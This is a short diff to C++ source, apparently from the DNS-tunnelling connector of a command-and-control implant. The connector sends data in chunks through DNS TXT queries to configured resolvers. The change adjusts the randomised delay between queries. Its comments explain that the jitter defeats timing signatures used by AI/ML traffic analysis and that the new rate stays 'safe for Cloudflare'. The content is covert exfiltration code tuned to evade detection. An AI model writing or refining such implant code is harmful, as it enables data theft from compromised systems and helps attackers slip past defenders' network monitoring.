@@ -594,10 +594,10 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
 
             // Pacing with Jitter (Traffic Shaping):
-            // Instead of a fixed 30ms delay, use a random delay between 20ms and 50ms.
-            // This breaks the timing regularity signatures used by AI/ML traffic analysis.
-            // Logic: 20 + (Random % 30)
-            ULONG pacing = 20 + (GetTickCount() % 30);
+            // Target: ~15 packets/sec (Avg ~65ms delay).
+            // Range: 50ms - 80ms.
+            // This is faster than the conservative setting but still safe for Cloudflare.
+            ULONG pacing = 50 + (GetTickCount() % 30);
             ApiWin->Sleep(pacing);
 
             offset += chunk;
